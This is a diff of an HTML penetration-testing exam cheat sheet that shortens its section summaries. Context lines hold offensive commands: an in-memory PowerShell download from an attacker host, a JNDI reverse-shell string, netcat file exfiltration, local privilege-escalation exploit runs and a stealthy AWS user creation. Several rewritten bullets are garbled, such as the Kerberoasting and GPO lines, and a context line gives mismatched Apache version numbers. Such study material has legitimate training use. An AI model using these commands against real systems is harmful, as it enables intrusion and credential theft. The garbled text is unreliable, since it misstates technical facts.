@@ -3479,7 +3479,7 @@ snmpwalk -c [community] -v [version] [ip] [oid]</code></pre>
               <ul><li>Additional reference: <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</a> | Modifying SNMP values: <a href="http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html" target="_blank" rel="noopener noreferrer">http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html</a></li></ul>
 
 <h3 id="information-gathering-ldap">2.17 389, 636, 3268 &amp; 3269: LDAP</h3>
-              <ul><li>Query LDAP for users, computers, groups, and password-related attributes; use search filters to surface cleartext passwords, SPNs, and delegated accounts.</li></ul>
+              <ul><li>LDAP queries for users, groups, SPNs, cleartext passwords, and delegated accounts.</li></ul>
 
               <ul>
               <li>Try anonymous bind first — many DCs allow read access to all objects without credentials.</li>
@@ -4237,7 +4237,7 @@ cewl -w wordlist.txt "http://[ip]/" --with-numbers
 john --wordlist=wordlist.txt --rules --stdout &gt; wordlist-modified.txt</code></pre>
 
 <h3 id="web-applications-webdav">4.1.5 WebDAV</h3>
-              <ul><li>WebDAV extends HTTP with file-management methods (PUT, MOVE, DELETE); when enabled with weak credentials on IIS, it allows direct file upload to a web shell.</li></ul>
+              <ul><li>WebDAV on IIS with weak creds = direct webshell upload via PUT.</li></ul>
 
               <pre><code class="language-bash"># nmap — confirm WebDAV is enabled and list allowed methods
 nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ [ip]
@@ -5151,7 +5151,7 @@ admin ' OR 1=1 --</code></pre>
 
               <ul><li>Extra references: <a href="https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html" target="_blank" rel="noopener noreferrer">SecurityIdiots Oracle Union-Based Injection</a></li></ul>
 <h3 id="web-applications-xxe-injection">4.6 XXE (XML External Entity) Injection</h3>
-              <ul><li>XXE vulnerabilities arise when an XML parser resolves external entities from untrusted input, letting an attacker read local files or exfiltrate data out-of-band.</li></ul>
+              <ul><li>XML parser resolves external entities from untrusted input &rarr; read local files or exfil data OOB.</li></ul>
               <ul>
               <li>If the target file contains XML special characters the entity breaks; base64-encode via a PHP filter wrapper or use a CDATA wrapper. Blind XXE requires an out-of-band channel (DNS/HTTP).</li>
               <li>SVG upload features and Office document importers (DOCX/XLSX) are common XXE entry points — embed the entity declaration directly inside the file's XML structure.</li>
@@ -5305,7 +5305,7 @@ admin ' OR 1=1 --</code></pre>
 &lt;/root&gt;</code></pre>
 
 <h3 id="web-applications-idor">4.7 IDOR (Insecure Direct Object References)</h3>
-              <ul><li>IDOR occurs when an application uses a client-supplied identifier to fetch a back-end object without verifying the authenticated session owns that object.</li></ul>
+              <ul><li>App fetches objects by client-supplied ID without ownership check.</li></ul>
               <ul>
               <li>Hashed or encoded references are not the same as authorisation; always decode and test. Test all HTTP methods — some apps enforce access on GET but not POST.</li>
               <li>Horizontal IDOR accesses a peer's resource at the same privilege level; vertical IDOR escalates privilege to an admin endpoint.</li>
@@ -5324,7 +5324,7 @@ for link in $(curl -s -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\/doc
 curl -O $url/$link
 done
 done</code></pre>
-              <ul><li>JavaScript AJAX calls sometimes expose admin-only API endpoints in the front-end code even when the UI hides them. Locate the function and call it directly to test whether backend access control is enforced:</li></ul>
+              <ul><li>JS source may expose admin API endpoints hidden from the UI &mdash; call them directly:</li></ul>
               <pre><code class="language-javascript">// Admin function exposed in client-side JS - test directly
 function changeUserPassword() {
 $.ajax({
@@ -5413,7 +5413,7 @@ success:function(result){}
               </table>
 
 <h3 id="web-applications-command-injections">4.8 Command Injections</h3>
-              <ul><li>Command injection occurs when user-supplied input is passed unsanitised to a shell function; append a second command using an injection operator to execute attacker-controlled code.</li></ul>
+              <ul><li>User input reaches a shell function unsanitised &mdash; chain a second command via injection operators.</li></ul>
               <ul>
               <li>Confirm with a time-delay payload (<code>; sleep 5</code>) when output is not reflected.</li>
               <li>WAFs often block <code>;</code>, <code>|</code>, <code>&amp;</code> — fall back to newline (<code>%0a</code>) or sub-shell (<code>$()</code>) variants.</li>
@@ -5674,7 +5674,7 @@ ${jndi:ldap://[attacker]:1389/bash-reverse-shell}</code></pre>
               </table>
 
 <h3 id="web-applications-exploiting-cves">4.10 Exploiting CVEs</h3>
-              <ul><li>Pre-built public exploits on Exploit-DB cover a wide range of web vulnerabilities; always match the exact version before running.</li></ul>
+              <ul><li>Search Exploit-DB by exact service version before running any public exploit.</li></ul>
               <ul>
               <li>Fingerprint the exact software name and version via headers, error pages, <code>/readme.txt</code>, or admin panels before firing any CVE exploit.</li>
               <li>Public exploits are often written for a narrow version range; read the source, adjust hardcoded offsets or paths, and check for backdoors.</li>
@@ -5752,7 +5752,7 @@ https://www.exploit-db.com/exploits/45853</code></pre>
               </table>
 
 <h3 id="web-applications-fixing-exploits">4.11 Fixing &amp; Modifying Public Exploits</h3>
-              <ul><li>Public exploits rarely run as-is. The skill that matters here is <strong>adapting an existing exploit</strong> to your target rather than writing one from scratch. There are two classes: memory-corruption exploits (buffer overflows) and web exploits. Always read the entire exploit before running it — public PoCs sometimes contain obfuscated backdoors that attack <em>you</em>.</li></ul>
+              <ul><li>Public exploits rarely work as-is — adapt IPs, offsets, and payload to your target. Read the full source first; PoCs sometimes contain obfuscated backdoors.</li></ul>
 
 <h3 id="web-applications-fixing-memory-corruption">4.11.1 Fixing Memory Corruption Exploits</h3>
               <ul><li><strong>Buffer overflow in a nutshell:</strong> user input overflows a stack buffer and overwrites the saved <strong>return address</strong>. When the function returns, that address is loaded into <code>EIP</code>/<code>RIP</code> (the instruction pointer). Overwrite it with the address of a <code>JMP ESP</code> instruction so execution jumps into your shellcode, which sits right after the return address (often behind a NOP sled).</li></ul>
@@ -5804,7 +5804,7 @@ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32</code></pre>
               </ul>
 
 <h3 id="web-applications-fixing-web-exploits">4.11.2 Fixing Web Exploits</h3>
-              <ul><li>Web exploits rarely involve hex-encoded shellcode, so fixing them is about making the script's assumptions match the live target. Walk through the code top-to-bottom and ask: what is hard-coded that differs in my scenario?</li></ul>
+              <ul><li>Walk web exploit code top-to-bottom &mdash; fix hard-coded IPs, ports, paths, and payload format to match your target.</li></ul>
               <table class="custom-table">
               <thead>
               <tr>
@@ -6434,7 +6434,7 @@ End Sub</code></pre>
               </table>
 
 <h2 id="exploit-dev">6. Exploit Development</h2>
-              <ul><li>The exam rewards the person who can <em>fix a broken PoC</em>, not the person who can write one from scratch. The vast majority of exam exploits are either Metasploit modules or public PoCs from ExploitDB/GitHub that need one or two adjustments before they fire on the lab target. The workflow is always: find the candidate, read it, sandbox it, adjust it, fire it &mdash; in that order.</li></ul>
+              <ul><li>Most exam exploits are MSF modules or ExploitDB PoCs needing minor tweaks. Workflow: find &rarr; read &rarr; sandbox &rarr; adjust &rarr; fire.</li></ul>
 
 <h3 id="exploit-dev-search">6.1 Finding Public Exploits</h3>
               <ul><li>You almost always pivot from a version string captured during enumeration (<code>nmap -sV</code>, banner grab, CMS fingerprint, default page). Match the version <em>exactly</em>: <code>vsftpd 2.3.4</code> &ne; <code>vsftpd 2.3.5</code>; <code>Apache 2.4.49</code> has CVE-2021-41773, <code>3.4.50</code> doesn&rsquo;t (initially), <code>3.4.51</code> doesn&rsquo;t at all.</li></ul>
@@ -6510,7 +6510,7 @@ i686-w64-mingw32-gcc -m32 -o ms11-046.exe ms11-046.c
 gcc -m32 cve.c -o cve         # apt install gcc-multilib if missing</code></pre>
 
 <h3 id="exploit-dev-bof">6.4 Stack Buffer Overflow Walkthrough</h3>
-              <ul><li>The exam doesn&rsquo;t require you to write a buffer overflow from zero, but you should be able to take a PoC that crashes a service, identify EIP, regenerate shellcode, and fire it. The pattern below is the classical vulnserver-style flow that every stack-overflow BOF follows.</li></ul>
+              <ul><li>Classical BOF flow: crash &rarr; find EIP offset &rarr; control EIP &rarr; bad chars &rarr; JMP ESP &rarr; shellcode.</li></ul>
               <pre><code class="language-bash"># 1. Fuzz / confirm the crash
 python3 -c 'import socket;s=socket.socket();s.connect(("10.10.10.5",9999));s.send(b"TRUN /.:/" + b"A"*5000); s.close()'
 
@@ -6580,7 +6580,7 @@ ndisasm -b 32 shellcode.bin
 ndisasm -b 64 shellcode.bin</code></pre>
 
 <h3 id="exploit-dev-mitigations">6.6 Modern Mitigations You&rsquo;ll Run Into</h3>
-              <ul><li>Exam targets are deliberately mitigation-light, but you&rsquo;ll still encounter these in the lab. Knowing the name + the workaround is enough &mdash; the exam doesn&rsquo;t expect you to defeat full ASLR+DEP+CFG from scratch.</li></ul>
+              <ul><li>Lab targets may have DEP/ASLR/CFG. Know the bypass name + technique &mdash; full exploitation not expected on exam.</li></ul>
               <table class="custom-table">
               <thead><tr><th>Mitigation</th><th>What it does</th><th>Practical workaround on exam-tier targets</th></tr></thead>
               <tbody>
@@ -7117,7 +7117,7 @@ msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=&lt;IP&gt; LPORT=&l
               </table>
 
 <h2 id="password-attacks">8. Password Attacks</h2>
-              <ul><li>Techniques for recovering credentials through brute-force, spraying, file hash cracking, and offline cracking with Hydra, John the Ripper, and Hashcat.</li></ul>
+              <ul><li>Brute-force, spraying, and offline hash cracking with Hydra, John, and Hashcat.</li></ul>
               <ul>
               <li>Always prefer offline cracking (no noise, no lockout) over online attacks when you have a captured hash or protected file.</li>
               <li>Start with <code>rockyou.txt</code>, then targeted wordlists, then mutated variants via Hashcat rules before brute-force keyspace.</li>
@@ -8816,7 +8816,7 @@ gcc CVE-2021-4034.c -o pwnkit; ./pwnkit
 gcc dirty-pipe.c -o dp; ./dp /etc/passwd</code></pre>
 
 <h2 id="tunneling">11. Tunneling</h2>
-              <ul><li>Forward traffic through a compromised DMZ host to reach otherwise-inaccessible internal targets. Choose the technique based on available binaries, OS, and firewall posture.</li></ul>
+              <ul><li>Relay traffic through a compromised host to reach internal targets.</li></ul>
 
               <table class="custom-table">
               <thead>
@@ -9014,7 +9014,7 @@ netsh advfirewall firewall delete rule name="[RULE_NAME]"
 netsh interface portproxy del v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP]</code></pre>
 
 <h3 id="tunneling-tools">11.2 Tunneling Tools</h3>
-              <ul><li>Ligolo-ng uses a kernel TUN interface for transparent Layer-3 routing; Chisel wraps tunnels inside HTTP for firewall evasion; Dnscat2 encodes C2 traffic inside DNS queries as a last-resort covert channel.</li></ul>
+              <ul><li>Ligolo-ng: TUN-based L3 routing. Chisel: HTTP tunneling. Dnscat2: DNS-based C2.</li></ul>
 
               <table class="custom-table">
               <thead>
@@ -9208,7 +9208,7 @@ socks5 127.0.0.1 &lt;REMOTE_PORT&gt;
 proxychains nmap localhost</code></pre>
 
 <h3 id="tunneling-dnscat2">11.17 Dnscat2 (DNS Tunneling)</h3>
-              <ul><li>Dnscat2 tunnels C2 traffic over DNS queries; use when only port 53 egress is permitted. Requires a registered domain with an NS record pointing to Kali, or direct UDP/53 access in lab environments.</li></ul>
+              <ul><li>DNS-tunneled C2 for port-53-only egress. Needs NS record pointing to Kali or direct UDP/53.</li></ul>
               <ul>
               <li>The client encodes data inside DNS query names (TXT, CNAME, MX lookups) destined for an attacker-controlled domain; the authoritative server on Kali decodes and responds, creating a bidirectional channel.</li>
               <li>Practical throughput is 1–10 KB/s; interactive shells work but are sluggish; avoid file transfers larger than a few kilobytes.</li>
@@ -9535,7 +9535,7 @@ smbclient -p [local_port] -L //127.0.0.1 -U [username] --password=[password]</co
               </ul>
 
 <h2 id="active-directory-enumeration">13. AD Enumeration</h2>
-              <ul><li>All authentication and resource discovery flows through the Domain Controller, making it the highest-value target. Begin AD enumeration as soon as you have any foothold — credentials, a domain-joined shell, or unauthenticated network access to DC ports.</li></ul>
+              <ul><li>Start AD enumeration with any foothold — creds, domain-joined shell, or network access to DC ports.</li></ul>
 
               <!-- AD Enumeration by Port/Protocol reference table -->
               <table class="custom-table">
@@ -9777,7 +9777,7 @@ mimikatz "sekurlsa::tickets /export"</code></pre>
               </table>
 
 <h3 id="active-directory-enumeration-ldap-enumeration">13.1.3 LDAP Enumeration (Port 389/636)</h3>
-              <ul><li>Query LDAP anonymously or with credentials to extract users, groups, computers, and sensitive attributes. Always prefer LDAPS (<code>-H ldaps://</code>) when submitting credentials to avoid cleartext bind on the wire. Key attributes to hunt: <code>ms-MCS-AdmPwd</code> (LAPS password), <code>description</code> containing passwords, <code>servicePrincipalName</code> (Kerberoastable), <code>userAccountControl</code> bit <code>4194304</code> (pre-auth disabled).</li></ul>
+              <ul><li>LDAP/LDAPS queries for users, groups, computers, and sensitive attributes. Prefer LDAPS (<code>-H ldaps://</code>) when submitting credentials to avoid cleartext bind on the wire. Key attributes to hunt: <code>ms-MCS-AdmPwd</code> (LAPS password), <code>description</code> containing passwords, <code>servicePrincipalName</code> (Kerberoastable), <code>userAccountControl</code> bit <code>4194304</code> (pre-auth disabled).</li></ul>
 
               <pre><code class="language-bash"># Nmap LDAP scripts
 nmap -n -sV --script "ldap* and not brute" [target_ip]</code></pre>
@@ -9822,7 +9822,7 @@ ldapsearch -H ldap://[target_ip] -x -D '[domain]\[user]' -w '[password]' -b "DC=
 (objectClass=cACertificate)                               # AD Certificate Services</code></pre>
 
 <h3 id="active-directory-enumeration-smb-netbios-enumeration">13.1.4 SMB/NetBIOS Enumeration (Port 445)</h3>
-              <ul><li>Enumerate shares, sessions, users, and OS info over SMB; test for null sessions and vulnerabilities; execute commands once credentials are found. SYSVOL and NETLOGON are world-readable on every DC — check SYSVOL for <code>Groups.xml</code> with <code>cpassword</code> (GPP passwords).</li></ul>
+              <ul><li>SMB: enumerate shares, users, sessions, null sessions. Execute commands with valid creds. SYSVOL and NETLOGON are world-readable on every DC — check SYSVOL for <code>Groups.xml</code> with <code>cpassword</code> (GPP passwords).</li></ul>
 
               <pre><code class="language-bash"># Host and service discovery
 nmap -v -p 139,445 [ip]
@@ -9882,7 +9882,7 @@ atexec.py [domain]/[user]:[password]@[ip] [command]</code></pre>
               <ul><li>Exploitation (EternalBlue - MS17-010): <a href="https://github.com/3ndG4me/AutoBlue-MS17-010" target="_blank" rel="noopener noreferrer">https://github.com/3ndG4me/AutoBlue-MS17-010</a></li></ul>
 
 <h3 id="active-directory-enumeration-winrm-enumeration">13.1.5 WinRM Enumeration and Access (Port 5985)</h3>
-              <ul><li>Test for WinRM access with found credentials and drop into an interactive session. Evil-WinRM supports pass-the-hash (<code>-H</code>), in-session upload/download, and loading scripts into memory (<code>-s</code>) to avoid writing tools to disk.</li></ul>
+              <ul><li>Evil-WinRM for interactive shells. Supports PTH (<code>-H</code>), in-session upload/download, and loading scripts into memory (<code>-s</code>) to avoid writing tools to disk.</li></ul>
 
               <pre><code class="language-bash"># Nmap scan
 nmap -p 5985,5986 --script winrm-info [ip]</code></pre>
@@ -9953,7 +9953,7 @@ $group.Properties | Select-Object {$_.cn}, {$_.member}
 }</code></pre>
 
 <h3 id="active-directory-enumeration-powerview">13.3 PowerView</h3>
-              <ul><li>PowerView wraps AD queries into concise PowerShell cmdlets — import it once, then enumerate domains, users, groups, computers, shares, and delegations. Load in-memory to avoid disk writes: <code>IEX (New-Object Net.WebClient).DownloadString('http://[attacker]/PowerView.ps1')</code>. <a href="https://github.com/emmasolis1/oscp" download target="_blank"><strong>Download PowerView.ps1</strong></a></li></ul>
+              <ul><li>PowerView: PowerShell AD enumeration cmdlets — import it once, then enumerate domains, users, groups, computers, shares, and delegations. Load in-memory to avoid disk writes: <code>IEX (New-Object Net.WebClient).DownloadString('http://[attacker]/PowerView.ps1')</code>. <a href="https://github.com/emmasolis1/oscp" download target="_blank"><strong>Download PowerView.ps1</strong></a></li></ul>
 
               <pre><code class="language-powershell"># Import PowerView
 Import-Module .\PowerView.ps1
@@ -9991,7 +9991,7 @@ Get-NetForestTrust
 Find-InterestingDomainAcl -ResolveGUIDs</code></pre>
 
 <h3 id="active-directory-enumeration-service-principal-names-spn-enumeration">13.4 Service Principal Names (SPN) Enumeration</h3>
-              <ul><li>List SPNs to identify service accounts eligible for Kerberoasting. Any authenticated user can request a TGS for an SPN and crack the account's password offline. Prioritise human-managed accounts (e.g. <code>MSSQLSvc</code>, <code>HTTP</code>, <code>exchangeMDB</code>) in privileged groups — gMSA accounts have 240-char rotating passwords and are not crackable.</li></ul>
+              <ul><li>Any authenticated user can Kerberoast SPN accounts. Prioritise human-managed accounts in privileged groups's password offline. Prioritise human-managed accounts (e.g. <code>MSSQLSvc</code>, <code>HTTP</code>, <code>exchangeMDB</code>) in privileged groups — gMSA accounts have 240-char rotating passwords and are not crackable.</li></ul>
 
               <pre><code class="language-bash"># List SPNs linked to a specific account
 setspn -L [service]</code></pre>
@@ -10620,7 +10620,7 @@ crackmapexec smb &lt;TARGET[s]&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &l
 crackmapexec smb &lt;TARGET[s]&gt; -u &lt;USERNAME&gt; -H LMHash:NTLMHash -d &lt;DOMAIN&gt; -M gpp_password</code></pre>
 
 <h3 id="active-directory-enumeration-scripts-adpeas">13.12 Scripts (adPEAS)</h3>
-              <ul><li>adPEAS is an automated PowerShell enumeration script covering domain info, rights, GPOs, ADCS, credentials, delegation, accounts, and BloodHound collection. Download from <a href="https://github.com/61106960/adPEAS?tab=readme-ov-file#important-note-about-the-bloodhound-module" target="_blank" rel="noopener noreferrer">github.com/61106960/adPEAS</a>.</li></ul>
+              <ul><li>adPEAS: automated PowerShell AD enumeration (domain info, rights, GPOs, ADCS, creds, delegation). Download from <a href="https://github.com/61106960/adPEAS?tab=readme-ov-file#important-note-about-the-bloodhound-module" target="_blank" rel="noopener noreferrer">github.com/61106960/adPEAS</a>.</li></ul>
 
               <table class="custom-table">
               <thead>
@@ -10799,7 +10799,7 @@ Get-DomainGMSA -Properties msDS-ManagedPassword</code></pre>
 ldapsearch -x -H ldap://&lt;domain_controller&gt; -D "&lt;user&gt;@&lt;domain&gt;" -w "&lt;password&gt;" -b "DC=domain,DC=com" "(objectClass=msDS-GroupManagedServiceAccount)" msDS-ManagedPassword</code></pre>
 
 <h3 id="active-directory-enumeration-group-policy-object-gpo-abuse">13.14 Group Policy Object (GPO) Abuse</h3>
-              <ul><li>If you hold write permissions on a GPO, you can inject a malicious scheduled task or local-admin entry that executes the next time any machine in the GPO's scope applies policy. Guides: <a href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview#group-policy-object-gpos" target="_blank" rel="noopener noreferrer">Hacktricks GPO Guide</a>, <a href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-group-policy-objects/" target="_blank" rel="noopener noreferrer">InternalAllTheThings Advanced Guide</a>. Tools: <a href="https://github.com/emmasolis1/oscp" download target="_blank" rel="noopener noreferrer">PowerView.ps1</a>, <a href="https://github.com/emmasolis1/oscp" download target="_blank" rel="noopener noreferrer">SharpGPOAbuse.exe</a> (<a href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank" rel="noopener noreferrer">GitHub</a>).</li></ul>
+              <ul><li>Writable GPO = inject a scheduled task or local-admin entry. Executes on next policy refresh for all machines in the GPO's scope applies policy. Guides: <a href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview#group-policy-object-gpos" target="_blank" rel="noopener noreferrer">Hacktricks GPO Guide</a>, <a href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-group-policy-objects/" target="_blank" rel="noopener noreferrer">InternalAllTheThings Advanced Guide</a>. Tools: <a href="https://github.com/emmasolis1/oscp" download target="_blank" rel="noopener noreferrer">PowerView.ps1</a>, <a href="https://github.com/emmasolis1/oscp" download target="_blank" rel="noopener noreferrer">SharpGPOAbuse.exe</a> (<a href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank" rel="noopener noreferrer">GitHub</a>).</li></ul>
 
               <table class="custom-table">
               <thead>
@@ -11083,7 +11083,7 @@ crackmapexec mssql &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --d
 crackmapexec mssql &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -q "SELECT name FROM master.dbo.sysdatabases"</code></pre>
 
 <h2 id="active-directory-attacking">14. AD Exploitation</h2>
-              <ul><li>AD attacks split into offline hash cracking (AS-REP Roasting, Kerberoasting) and ticket/hash reuse (Pass-the-Hash, Pass-the-Ticket, Silver/Golden Tickets); DCSync yields raw hashes that feed both paths.</li></ul>
+              <ul><li>Offline cracking (AS-REP, Kerberoasting) vs. ticket/hash reuse (PTH, PTT, Silver/Golden). DCSync feeds both.</li></ul>
 
               <!-- ===== KERBEROS ATTACK REFERENCE TABLE ===== -->
               <table class="custom-table">
@@ -11809,7 +11809,7 @@ crackmapexec smb [ip/domain] -u [userName] -p '[password]!' -d [domain.com] --ex
               </table>
 
 <h3 id="active-directory-attacking-using-kerbrute">14.9.4 kerbrute</h3>
-              <ul><li>Sprays via Kerberos pre-auth — faster and quieter than LDAP spraying; also useful for username enumeration (KDC_ERR_C_PRINCIPAL_UNKNOWN = invalid user). The executable is on the kerbrute GitHub (see Section 18.3.2.2).</li></ul>
+              <ul><li>Kerberos pre-auth spraying — faster and quieter than LDAP spraying; also useful for username enumeration (KDC_ERR_C_PRINCIPAL_UNKNOWN = invalid user). The executable is on the kerbrute GitHub (see Section 18.3.2.2).</li></ul>
               <pre><code class="language-powershell"># Password spray via Kerberos pre-auth
 .\kerbrute_windows_amd64.exe passwordspray -d [domain.com] .\[usernames_file].txt "[password]"
 </code></pre>
@@ -12067,7 +12067,7 @@ crackmapexec winrm [ip] -u [user] -p [password] --exec-method invoke_command</co
               </li></ul>
 
 <h3 id="active-directory-attacking-pass-the-ticket-ptt">14.13 Pass-the-Ticket (PtT)</h3>
-              <ul><li>Steal a Kerberos TGT from LSASS memory and inject it into your session to authenticate as the ticket owner across the domain — no password needed. Requires SYSTEM or local admin on the host where the target user has an active logon session.</li></ul>
+              <ul><li>Steal TGT from LSASS, inject into session to authenticate as ticket owner — no password needed. Requires SYSTEM or local admin on the host where the target user has an active logon session.</li></ul>
               <ul>
               <li>TGTs expire after 10 hours by default (renewable up to 7 days); renew near-expiry tickets with <code>Rubeus.exe renew /ticket:[base64]</code>.</li>
               <li>PtT works over Kerberos only; PtH works over NTLM — prefer PtT in environments with NTLMv2 restrictions.</li>
@@ -12491,7 +12491,7 @@ crackmapexec ssh &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;
 crackmapexec http &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;</code></pre>
 
 <h2 id="aws-enum">16. AWS Enumeration</h2>
-              <ul><li>Cloud recon and exploitation are part of the modern syllabus. The pattern: discover assets from the outside (DNS, certificates, public S3 buckets, exposed APIs), then with credentials inside, scope IAM permissions and walk the resource graph.</li></ul>
+              <ul><li>External recon (DNS, certs, public S3, APIs), then enumerate IAM permissions and walk the resource graph.</li></ul>
 <h3 id="aws-recon">16.1 Reconnaissance From the Internet</h3>
               <pre><code class="language-bash"># Subdomain takeovers and CDN fingerprints
 amass enum -passive -d example.com
@@ -12573,7 +12573,7 @@ aws ec2 describe-instances --query \
 aws iam list-users --query 'Users[?contains(UserName, `admin`)].UserName'</code></pre>
 
 <h2 id="aws-exploit">17. AWS Exploitation</h2>
-              <ul><li>Once inside, the wins are: leaked secrets in Git or S3, overly permissive IAM trust policies, dependency-chain attacks against build pipelines, and lateral movement via assumed roles.</li></ul>
+              <ul><li>Hunt for: secrets in Git/S3, permissive IAM trust policies, build pipeline abuse, role assumption.</li></ul>
 <h3 id="aws-secrets">17.1 Leaked Secrets</h3>
               <pre><code class="language-bash"># Hunt for keys in S3 buckets, Git repos, container images
 gitleaks detect --source ./ --report-format json --report-path leaks.json
@@ -12823,7 +12823,7 @@ aws iam create-user --user-name svc-backups       # blend in with service accoun
               <li><strong>Compliance Impact</strong> (optional) — relevant standards and how exploitation affects regulatory standing.</li>
               </ol>
 
-              <ul><li>The following table shows how CVSS v3.1 base score bands translate into severity labels, what that severity means in practical terms, and a representative example of a vulnerability in each band:</li></ul>
+              <ul><li>CVSS v3.1 severity bands:</li></ul>
               <table class="custom-table">
               <thead>
               <tr>
@@ -12884,7 +12884,7 @@ aws iam create-user --user-name svc-backups       # blend in with service accoun
               </ol>
               <ul>
               <li>Rehearse critical findings — practice explaining each in under two minutes.</li>
-              <li>Prepare a risk heat map (likelihood vs. impact) to communicate the overall landscape faster than prose.</li>
+              <li>Include a risk heat map (likelihood vs. impact) — faster to read than prose.</li>
               <li>Keep raw evidence (tool output, logs) available on request but do not lead with it.</li>
               <li>Agree on retest scope before the session ends — confirm which findings will be retested and when.</li>
               <li>Clarify the report's distribution list and format (PDF only, no editable copies).</li>
@@ -13056,7 +13056,7 @@ base64 file_to_send.txt | nc [receiver_ip] 4444</code></pre>
 <h2 id="utilities">20. Utilities</h2>
 
 <h3 id="utilities-reverse-shells">20.1 Reverse Shells</h3>
-              <ul><li>Ready-to-use reverse shell payloads across multiple languages — substitute <code>&lt;TARGET_IP&gt;</code> and <code>&lt;TARGET_PORT&gt;</code> before firing. When a firewall blocks arbitrary high ports, try 80, 443, or 53.</li></ul>
+              <ul><li>Reverse shell payloads — substitute <code>&lt;TARGET_IP&gt;</code> and <code>&lt;TARGET_PORT&gt;</code> before firing. When a firewall blocks arbitrary high ports, try 80, 443, or 53.</li></ul>
 
               <table class="custom-table">
               <thead>
@@ -13344,7 +13344,7 @@ exec "/bin/bash"</code></pre>
               </ul>
 
 <h3 id="utilities-connect-to-rdp">20.4 Connect to RDP</h3>
-              <ul><li>Connect to Windows RDP using credentials, hashes, or GUI prompts — and how to enable RDP when it is off. Pass-the-hash only works when NLA is disabled (<code>UserAuthenticationRequired = 0</code>).</li></ul>
+              <ul><li>RDP with creds, hashes, or GUI prompts — and how to enable RDP when it is off. Pass-the-hash only works when NLA is disabled (<code>UserAuthenticationRequired = 0</code>).</li></ul>
 
               <table class="custom-table">
               <thead>
